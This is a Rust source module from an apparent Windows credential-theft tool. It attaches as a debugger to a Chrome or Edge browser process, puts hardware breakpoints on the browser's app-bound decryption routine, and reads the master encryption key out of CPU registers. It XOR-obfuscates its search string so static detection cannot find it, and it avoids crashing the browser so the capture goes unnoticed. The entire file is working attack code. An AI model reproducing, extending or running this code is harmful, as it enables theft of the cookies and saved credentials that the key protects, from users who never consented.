use std::mem::{transmute, zeroed};
use std::sync::OnceLock;
use std::time::{Duration, Instant};

use windows::core::{s, w};
use windows::Win32::Foundation::{
    CloseHandle, DBG_CONTINUE, DBG_EXCEPTION_NOT_HANDLED, EXCEPTION_BREAKPOINT,
    EXCEPTION_SINGLE_STEP, HANDLE,
};
use windows::Win32::System::Diagnostics::Debug::{
    ContinueDebugEvent, GetThreadContext, SetThreadContext, WaitForDebugEvent, CONTEXT,
    CONTEXT_CONTROL_AMD64, CONTEXT_DEBUG_REGISTERS_AMD64, CONTEXT_INTEGER_AMD64,
    CREATE_THREAD_DEBUG_EVENT, DEBUG_EVENT, EXCEPTION_DEBUG_EVENT, EXIT_PROCESS_DEBUG_EVENT,
    LOAD_DLL_DEBUG_EVENT, LOAD_DLL_DEBUG_INFO,
};
use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
use windows::Win32::System::Threading::{OpenThread, ResumeThread, SuspendThread, THREAD_ALL_ACCESS};

use crate::db::KeyCandidate;
use crate::mem;
use crate::pe;

const ANCHOR_KEY: u8 = 0x5A;
const ANCHOR_ENC: [u8; 44] = [
    0x15, 0x09, 0x19, 0x28, 0x23, 0x2a, 0x2e, 0x74, 0x1b, 0x2a, 0x2a, 0x18,
    0x35, 0x2f, 0x34, 0x3e, 0x0a, 0x28, 0x35, 0x2c, 0x33, 0x3e, 0x3f, 0x28,
    0x74, 0x1e, 0x3f, 0x39, 0x28, 0x23, 0x2a, 0x2e, 0x74, 0x08, 0x3f, 0x29,
    0x2f, 0x36, 0x2e, 0x19, 0x35, 0x3e, 0x3f, 0x5a,
];

fn anchor_key() -> u8 {
    // Route the key through a runtime pointer load (black-boxed) so the
    // compiler cannot constant-fold the whole transform and re-emit the
    // plaintext anchor in .rdata.
    let key: [u8; 1] = [ANCHOR_KEY];
    let p = std::hint::black_box(&key[0] as *const u8);
    unsafe { *p }
}

fn decrypt_anchor() -> Vec<u8> {
    let key = anchor_key();
    ANCHOR_ENC.iter().map(|b| b ^ key).collect()
}

const KEY_LEN: usize = 32;
/// Hardware debug registers provide four execution breakpoints.
const MAX_SLOTS: usize = 4;

/// Total time the debug loop may run. Startup can block for seconds at a time
/// without producing any debug event (notably the COM round trip into the
/// elevation service that hands over the wrapped key), so a short per-event
/// wait would abandon the capture right before the decryption happens. A
/// generous window with a hard deadline keeps us listening until the hit.
const CAPTURE_WINDOW: Duration = Duration::from_secs(30);

/// On x64, Get/SetThreadContext require the CONTEXT buffer to be 16-byte
/// aligned (the C header uses __declspec(align(16)), which the windows crate
/// does not carry over; without this wrapper every call fails with
/// ERROR_INVALID_PARAMETER).
#[repr(C, align(16))]
struct AlignedContext(CONTEXT);

/// Walk the debuggee's threads like the original tool's default path
/// (NtGetNextThread). A toolhelp thread snapshot enumerates every thread in
/// the system and can deadlock while the debuggee is frozen mid-load.
type NtGetNextThreadFn =
    unsafe extern "system" fn(HANDLE, HANDLE, u32, u32, u32, *mut HANDLE) -> i32;

fn nt_get_next_thread() -> Option<NtGetNextThreadFn> {
    static FN: OnceLock<Option<NtGetNextThreadFn>> = OnceLock::new();
    *FN.get_or_init(|| unsafe {
        let ntdll = GetModuleHandleW(w!("ntdll.dll")).ok()?;
        let address = GetProcAddress(ntdll, s!("NtGetNextThread"))?;
        Some(transmute(address))
    })
}

/// Write the given breakpoint sites into the thread's debug registers
/// (an empty list clears them all).
fn apply_slots(hthread: HANDLE, slots: &[usize]) -> bool {
    let mut aligned = AlignedContext(unsafe { zeroed() });
    let ctx = &mut aligned.0;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
    if let Err(e) = unsafe { GetThreadContext(hthread, ctx) } {
        crate::log_err!("[-] GetThreadContext failed: {e}");
        return false;
    }
    ctx.Dr0 = 0;
    ctx.Dr1 = 0;
    ctx.Dr2 = 0;
    ctx.Dr3 = 0;
    ctx.Dr6 = 0;
    ctx.Dr7 = 0;
    for (i, addr) in slots.iter().enumerate().take(MAX_SLOTS) {
        let slot_addr = *addr as u64;
        match i {
            0 => ctx.Dr0 = slot_addr,
            1 => ctx.Dr1 = slot_addr,
            2 => ctx.Dr2 = slot_addr,
            _ => ctx.Dr3 = slot_addr,
        }
        // Local enable for the slot; RW/LEN stay 0 = execute, 1 byte.
        ctx.Dr7 |= 1u64 << i;
    }
    if let Err(e) = unsafe { SetThreadContext(hthread, ctx) } {
        crate::log_err!("[-] SetThreadContext failed: {e}");
        return false;
    }
    true
}

/// Disable a single slot on a thread that is already frozen in a debug event.
fn clear_slot(hthread: HANDLE, index: usize) -> bool {
    let mut aligned = AlignedContext(unsafe { zeroed() });
    let ctx = &mut aligned.0;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
    if let Err(e) = unsafe { GetThreadContext(hthread, ctx) } {
        crate::log_err!("[-] GetThreadContext failed: {e}");
        return false;
    }
    match index {
        0 => ctx.Dr0 = 0,
        1 => ctx.Dr1 = 0,
        2 => ctx.Dr2 = 0,
        _ => ctx.Dr3 = 0,
    }
    ctx.Dr7 &= !(1u64 << index);
    ctx.Dr6 = 0;
    if let Err(e) = unsafe { SetThreadContext(hthread, ctx) } {
        crate::log_err!("[-] SetThreadContext failed: {e}");
        return false;
    }
    true
}

fn arm_thread(hthread: HANDLE, slots: &[usize]) {
    if unsafe { SuspendThread(hthread) } == u32::MAX {
        crate::log_err!("[-] SuspendThread failed (thread likely exited); skipping");
        return;
    }
    apply_slots(hthread, slots);
    unsafe { ResumeThread(hthread) };
}

/// Returns the number of threads the breakpoints were actually set on.
fn arm_on_debuggee_threads(hprocess: HANDLE, slots: &[usize]) -> usize {
    let Some(get_next_thread) = nt_get_next_thread() else {
        crate::log_err!("[-] NtGetNextThread is unavailable; cannot arm breakpoints");
        return 0;
    };
    let mut armed = 0;
    let mut previous = HANDLE::default();
    loop {
        let mut next = HANDLE::default();
        let status = unsafe {
            get_next_thread(hprocess, previous, THREAD_ALL_ACCESS.0, 0, 0, &mut next)
        };
        if !previous.is_invalid() {
            unsafe { let _ = CloseHandle(previous); };
        }
        if status != 0 {
            break;
        }
        arm_thread(next, slots);
        armed += 1;
        previous = next;
    }
    armed
}

fn dll_name(hprocess: HANDLE, load: &LOAD_DLL_DEBUG_INFO) -> Option<String> {
    if load.lpImageName.is_null() {
        return None;
    }
    // lpImageName points at a pointer inside the target's address space.
    let string_ptr: usize = mem::read_value(hprocess, load.lpImageName as usize)?;
    if string_ptr == 0 {
        return None;
    }
    let raw = mem::read_bytes(hprocess, string_ptr, 2048)?;
    let full = if load.fUnicode != 0 {
        let wide: Vec<u16> = raw
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        let end = wide.iter().position(|&c| c == 0).unwrap_or(wide.len());
        String::from_utf16_lossy(&wide[..end])
    } else {
        let end = raw.iter().position(|&b| b == 0).unwrap_or(raw.len());
        String::from_utf8_lossy(&raw[..end]).to_string()
    };
    Some(full.rsplit(['\\', '/']).next().unwrap_or(&full).to_string())
}

/// General purpose registers most likely to hold the key pointer first, based
/// on the original tool's observations (Chrome: R15, Edge: R14). The register
/// layout shifts between browser versions, so we try all of them and let the
/// decryption itself validate which one is real.
fn register_values(ctx: &CONTEXT) -> [(&'static str, u64); 15] {
    [
        ("R14", ctx.R14),
        ("R15", ctx.R15),
        ("RAX", ctx.Rax),
        ("RBX", ctx.Rbx),
        ("RCX", ctx.Rcx),
        ("RDX", ctx.Rdx),
        ("RSI", ctx.Rsi),
        ("RDI", ctx.Rdi),
        ("RBP", ctx.Rbp),
        ("R8", ctx.R8),
        ("R9", ctx.R9),
        ("R10", ctx.R10),
        ("R11", ctx.R11),
        ("R12", ctx.R12),
        ("R13", ctx.R13),
    ]
}

fn push_candidate(candidates: &mut Vec<KeyCandidate>, bytes: Vec<u8>, label: String) {
    if let Ok(key) = bytes.as_slice().try_into() {
        if !candidates.iter().any(|c| c.key == key) {
            crate::log_out!("[+] Key candidate from {label}");
            candidates.push(KeyCandidate { label, key });
        }
    }
}

fn collect_candidates(hprocess: HANDLE, ctx: &CONTEXT, candidates: &mut Vec<KeyCandidate>) {
    for (name, value) in register_values(ctx) {
        if value == 0 {
            continue;
        }
        // The key pointer may sit in the register itself, or be stored at
        // the address the register points to.
        if let Ok(deref) = mem::read_value_result::<u64>(hprocess, value as usize) {
            if deref != 0 {
                if let Ok(bytes) = mem::read_bytes_result(hprocess, deref as usize, KEY_LEN) {
                    push_candidate(candidates, bytes, format!("{name}->[{deref:#x}]"));
                }
            }
        }
        if let Ok(bytes) = mem::read_bytes_result(hprocess, value as usize, KEY_LEN) {
            push_candidate(candidates, bytes, name.to_string());
        }
    }
}

fn locate_breakpoints(hprocess: HANDLE, base: usize) -> Vec<usize> {
    let anchor = decrypt_anchor();
    let Some(string_va) = pe::find_pattern(hprocess, base, &anchor) else {
        return Vec::new();
    };
    pe::find_lea_xrefs(hprocess, base, string_va)
}

/// Attach as the debugger (the caller already did DebugActiveProcess) and wait
/// for the browser to run through its own app-bound decryption. On every
/// breakpoint hit, harvest key candidates from all registers; the true key is
/// picked later by validating candidates against real encrypted blobs.
pub fn run(hprocess: HANDLE, pid: u32, target_module: &str) -> Vec<KeyCandidate> {
    let mut candidates: Vec<KeyCandidate> = Vec::new();
    let mut slots: Vec<usize> = Vec::new();
    let mut fired: Vec<usize> = Vec::new();
    let started = Instant::now();
    let deadline = started + CAPTURE_WINDOW;
    let mut event: DEBUG_EVENT = unsafe { zeroed() };

    loop {
        let remaining_ms = deadline
            .saturating_duration_since(Instant::now())
            .as_millis() as u32;
        if remaining_ms == 0 || unsafe { WaitForDebugEvent(&mut event, remaining_ms) }.is_err() {
            if !slots.is_empty() {
                // Detaching with breakpoints still armed would crash the browser.
                arm_on_debuggee_threads(hprocess, &[]);
            }
            crate::log_err!(
                "[-] The debug loop ended after {:?} without a completed capture",
                started.elapsed()
            );
            break;
        }

        let tid = event.dwThreadId;
        let ev_pid = event.dwProcessId;

        match event.dwDebugEventCode {
            EXCEPTION_DEBUG_EVENT => {
                let info = unsafe { event.u.Exception };
                let code = info.ExceptionRecord.ExceptionCode;
                // Only trust single-step exceptions from our own debuggee
                // (child processes report debug events to us as well).
                if ev_pid == pid && code == EXCEPTION_SINGLE_STEP && !slots.is_empty() {
                    let mut aligned = AlignedContext(unsafe { zeroed() });
                    let ctx = &mut aligned.0;
                    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64
                        | CONTEXT_INTEGER_AMD64
                        | CONTEXT_CONTROL_AMD64;
                    let Ok(hthread) = (unsafe { OpenThread(THREAD_ALL_ACCESS, false, tid) }) else {
                        unsafe { let _ = ContinueDebugEvent(ev_pid, tid, DBG_CONTINUE); };
                        continue;
                    };
                    unsafe { GetThreadContext(hthread, ctx) }.ok();
                    crate::log_out!(
                        "[+] Hardware breakpoint hit on thread {tid}, RIP = {:#x}",
                        ctx.Rip
                    );
                    crate::log_out!(
                        "[*] R14={:#x} R15={:#x} RAX={:#x} RBX={:#x}",
                        ctx.R14,
                        ctx.R15,
                        ctx.Rax,
                        ctx.Rbx
                    );
                    collect_candidates(hprocess, ctx, &mut candidates);

                    // Whichever slot fired (Dr6 bits B0..B3) must be disabled
                    // on this thread, or continuing re-triggers it endlessly.
                    let bit = (ctx.Dr6 & 0xF).trailing_zeros() as usize;
                    if bit < slots.len() {
                        clear_slot(hthread, bit);
                        if !fired.contains(&bit) {
                            fired.push(bit);
                        }
                    }
                    unsafe { let _ = CloseHandle(hthread); };

                    if fired.len() >= slots.len() {
                        arm_on_debuggee_threads(hprocess, &[]);
                        // The current debug event must be continued before
                        // detaching, or the frozen thread surfaces its
                        // unconsumed single-step as an unhandled exception
                        // once no debugger is attached anymore.
                        unsafe { let _ = ContinueDebugEvent(ev_pid, tid, DBG_CONTINUE); };
                        break;
                    }
                    unsafe { let _ = ContinueDebugEvent(ev_pid, tid, DBG_CONTINUE); };
                    continue;
                }
                // Never claim we handled the target's own exceptions: browser
                // components (trap handlers, sandbox, SEH) rely on their own
                // first-chance exception dispatch. Only consume debugger
                // breakpoints from the initial attach / new processes.
                let status = if code == EXCEPTION_BREAKPOINT && info.dwFirstChance != 0 {
                    DBG_CONTINUE
                } else {
                    DBG_EXCEPTION_NOT_HANDLED
                };
                unsafe { let _ = ContinueDebugEvent(ev_pid, tid, status); };
                continue;
            }
            CREATE_THREAD_DEBUG_EVENT => {
                if !slots.is_empty() && ev_pid == pid {
                    if let Ok(hthread) = unsafe { OpenThread(THREAD_ALL_ACCESS, false, tid) } {
                        arm_thread(hthread, &slots);
                        unsafe { let _ = CloseHandle(hthread); };
                    }
                }
            }
            LOAD_DLL_DEBUG_EVENT => {
                if slots.is_empty() && ev_pid == pid {
                    let load = unsafe { event.u.LoadDll };
                    if let Some(name) = dll_name(hprocess, &load) {
                        if name.eq_ignore_ascii_case(target_module) {
                            let base = load.lpBaseOfDll as usize;
                            crate::log_out!("[*] {target_module} loaded at {base:#x}");
                            let xrefs = locate_breakpoints(hprocess, base);
                            if xrefs.is_empty() {
                                crate::log_err!(
                                    "[-] Failed to locate the decryption routine; cannot continue"
                                );
                            } else {
                                slots = xrefs;
                                slots.truncate(MAX_SLOTS);
                                let armed = arm_on_debuggee_threads(hprocess, &slots);
                                crate::log_out!(
                                    "[*] Hardware breakpoints armed on {armed} threads at {} site(s)",
                                    slots.len()
                                );
                            }
                        }
                    }
                }
            }
            EXIT_PROCESS_DEBUG_EVENT => {
                if ev_pid == pid {
                    crate::log_out!("[+] The main debuggee (pid {ev_pid}) exited");
                    unsafe { let _ = ContinueDebugEvent(ev_pid, tid, DBG_CONTINUE); };
                    break;
                }
                // A child process exited; keep watching the main debuggee.
                unsafe { let _ = ContinueDebugEvent(ev_pid, tid, DBG_CONTINUE); };
            }
            _ => {}
        }
        unsafe { let _ = ContinueDebugEvent(ev_pid, tid, DBG_CONTINUE); };
    }
    candidates
}
